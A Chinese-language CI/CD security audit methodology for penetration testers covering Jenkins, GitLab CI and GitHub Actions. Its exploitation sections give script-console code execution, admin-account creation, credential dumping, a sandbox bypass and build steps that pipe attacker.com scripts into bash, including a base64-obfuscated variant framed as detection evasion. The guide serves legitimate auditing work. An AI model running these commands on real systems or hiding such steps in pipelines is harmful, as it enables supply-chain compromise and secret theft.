# CI/CD 配置审计方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对 CI/CD（持续集成/持续部署）管道配置安全审计的系统性方法论。CI/CD 系统通常拥有生产环境的高级访问权限，配置错误可能导致供应链攻击和凭证泄露。

### 1.2 适用范围
- Jenkins
- GitLab CI/CD
- GitHub Actions
- CircleCI
- Travis CI
- Azure DevOps
- TeamCity
- Bamboo

### 1.3 读者对象
- 渗透测试工程师
- DevSecOps 工程师
- 应用安全审计人员
- 平台工程团队

---

## 第二部分：核心渗透技术专题

### 专题：CI/CD 配置审计

#### 2.1 技术介绍

CI/CD 系统是软件交付管道的核心，负责代码构建、测试和部署。由于 CI/CD 系统通常需要访问源代码、构建产物和生产环境，它们成为攻击者的高价值目标。

**常见 CI/CD 配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **未授权访问** | CI/CD 界面无认证 | 严重 |
| **凭证泄露** | 硬编码或明文存储凭证 | 严重 |
| **任意代码执行** | 允许未经验证的代码执行 | 严重 |
| **Webhook 配置错误** | Webhook 未验证 | 高 |
| **插件漏洞** | 使用存在漏洞的插件 | 高 |
| **过度权限** | Service Account 权限过大 | 高 |
| **日志泄露** | 构建日志包含敏感信息 | 中 |

**常见 CI/CD 平台：**

| 平台 | 默认端口 | 特点 |
|-----|---------|------|
| Jenkins | 8080 | 插件丰富、广泛使用 |
| GitLab | 80/443 | 一体化 DevOps 平台 |
| GitHub Actions | SaaS | 与 GitHub 深度集成 |
| TeamCity | 8111 | JetBrains 产品 |

#### 2.2 审计常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **快速交付压力** | 安全配置被忽略 |
| **第三方插件** | 插件供应链攻击 |
| **多租户环境** | 租户隔离不足 |
| **云原生 CI/CD** | 容器逃逸风险 |
| **开源项目** | 公共 CI/CD 配置错误 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. CI/CD 服务发现**

```bash
# Jenkins 检测
curl http://target:8080/login?from=%2F
curl -I http://target:8080/

# GitLab 检测
curl http://target/users/sign_in

# TeamCity 检测
curl http://target:8111/

# 使用 Nmap 识别
nmap -sV --script http-enum target
```

**2. 未授权访问检测**

```bash
# Jenkins 未授权访问
curl http://target:8080/api/json
curl http://target:8080/computer/api/json

# Jenkins 脚本控制台
curl http://target:8080/script

# GitLab 公开项目枚举
curl http://target/api/v4/projects

# GitHub Actions 工作流查看
# 通过 GitHub Web 界面查看
```

**3. 默认凭证测试**

| 平台 | 用户名 | 密码 |
|-----|-------|------|
| Jenkins | admin | admin |
| Jenkins | admin | password |
| TeamCity | admin | (空) |
| GitLab | root | 5iveL!fe |

**4. 自动化扫描工具**

```bash
# Jenkins 扫描
git clone https://github.com/jenkinsci/security-scanner
jenkins-scan -u http://target:8080

# 使用 Nuclei
nuclei -t http/vulnerabilities/jenkins/ -u target

# 使用 Metasploit
use auxiliary/scanner/http/jenkins_enum
use exploit/multi/http/jenkins_script_console
```

##### 2.3.2 白盒测试

**1. Jenkins 配置检查**

```groovy
// Jenkinsfile 安全检查
// ❌ 不安全：拉取并执行远程代码
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh 'curl http://evil.com/script.sh | bash'
            }
        }
    }
}

// ✅ 安全：使用版本控制的脚本
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh './scripts/build.sh'
            }
        }
    }
}
```

```xml
<!-- config.xml 检查 -->
<!-- ❌ 不安全：无认证配置 -->
<useSecurity>false</useSecurity>

<!-- ✅ 安全：启用认证 -->
<useSecurity>true</useSecurity>
<authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
</authorizationStrategy>
```

**2. GitHub Actions 配置检查**

```yaml
# .github/workflows/ci.yml
# ❌ 不安全：pull_request_target 滥用
on:
  pull_request_target:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      # 攻击者可以控制 PR 代码在此执行

# ✅ 安全：使用 pull_request
on:
  pull_request:
    branches: [main]

# ❌ 不安全：过度权限
permissions: write-all

# ✅ 安全：最小权限
permissions:
  contents: read
```

**3. GitLab CI 配置检查**

```yaml
# .gitlab-ci.yml
# ❌ 不安全：使用外部不可信镜像
stages:
  - build
build:
  image: attacker/malicious-image
  script:
    - echo "Building..."

# ❌ 不安全：变量明文
variables:
  DB_PASSWORD: "secret123"
  AWS_SECRET_KEY: "AKIA..."

# ✅ 安全：使用 CI/CD 变量
# 在 GitLab Settings > CI/CD > Variables 中配置
```

#### 2.4 漏洞利用方法

##### 2.4.1 Jenkins 利用

```bash
# 1. 未授权访问信息收集
curl http://target:8080/api/json
curl http://target:8080/computer/api/json

# 2. 脚本控制台执行代码
curl -X POST http://target:8080/scriptText \
  -d "script=println 'id'.execute().text"

# 3. 创建管理员用户
curl -X POST http://target:8080/scriptText \
  -d "script=jenkins.model.Jenkins.instance.securityRealm.createAccount('attacker','password')"

# 4. 使用 Metasploit
use exploit/multi/http/jenkins_script_console
set RHOSTS target
set RPORT 8080
exploit
```

##### 2.4.2 GitLab CI 利用

```bash
# 1. 窃取 CI/CD 变量
# 通过恶意 MR 读取受保护的变量

# 2. 利用 Runner 逃逸
# 如果 Runner 配置不当，可能逃逸到宿主机

# 3. 供应链攻击
# 修改 .gitlab-ci.yml 添加恶意步骤
stages:
  - build
  - deploy
build:
  script:
    - curl http://attacker.com/backdoor.sh | bash  # 恶意代码
```

##### 2.4.3 GitHub Actions 利用

```yaml
# 1. pull_request_target 滥用
# 攻击者创建恶意 PR，代码在目标仓库上下文执行
# 可以窃取 Secrets

# 2. 工作流注入
# 通过可控的输入注入到 run 命令
name: CI
on:
  issue_comment:
    types: [created]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}"
      # 攻击者可以通过评论注入命令

# 3. 窃取 Secrets
# 通过恶意 Action 或 Fork 的 PR
```

##### 2.4.4 凭证窃取

```bash
# Jenkins 凭证提取
# 通过脚本控制台
curl -X POST http://target:8080/scriptText \
  -d "script=com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each{println it}"

# GitLab Runner Token
cat /etc/gitlab-runner/config.toml

# GitHub Actions Secrets
# 通过恶意工作流打印 Secrets
- run: env  # 可能泄露环境变量中的 Secrets
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 认证绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **CVE 漏洞** | 利用已知漏洞绕过 | CVE-2018-1000861 |
| **SSRF** | 通过 SSRF 访问内网 CI/CD | 访问 localhost:8080 |
| **配置错误** | 利用未授权 API | /api/json |

##### 2.5.2 沙箱绕过

```groovy
// Jenkins Script Security Sandbox 绕过
// CVE-2018-1000861
@GrabConfig(disableChecksums=true)
@GrabResolver(name='test', root='http://attacker.com')
@Grab(group='pkg', module='test', version='1')
import test;
```

##### 2.5.3 检测绕过

```yaml
# 隐藏恶意代码
- name: Build
  run: |
    # 看起来正常的构建
    npm install
    npm run build
    # 隐藏的恶意代码
    curl http://attacker.com/shell.sh | bash &

# 使用编码绕过
- run: echo "Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgYmFzaA==" | base64 -d | bash
```

---

## 第三部分：附录

### 3.1 CI/CD 安全配置检查清单

| 检查项 | Jenkins | GitLab CI | GitHub Actions |
|-------|---------|----------|---------------|
| **认证** | 启用矩阵认证 | 强制 MFA | 组织策略 |
| **授权** | 最小权限原则 | 保护分支 | 环境保护 |
| **Secrets** | 凭证存储 | CI/CD 变量 | Repository Secrets |
| **审计** | 审计日志 | 审计事件 | 审计日志 |
| **网络** | 限制访问 | 私有 Runner | Self-hosted Runner |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Jenkins-Scan** | Jenkins 扫描 | `jenkins-scan -u target` |
| **GitLab-Scan** | GitLab 扫描 | 专用脚本 |
| **Gato** | GitHub Actions 审计 | `gato enumerate -t target` |
| **Metasploit** | 漏洞利用 | `jenkins_script_console` |

### 3.3 修复建议

- [ ] 启用强认证和 MFA
- [ ] 实施最小权限原则
- [ ] 使用 Secret 管理工具
- [ ] 审计和监控 CI/CD 活动
- [ ] 定期更新和打补丁
- [ ] 隔离构建环境
- [ ] 审查第三方 Actions/Plugins
- [ ] 保护 Webhook 配置
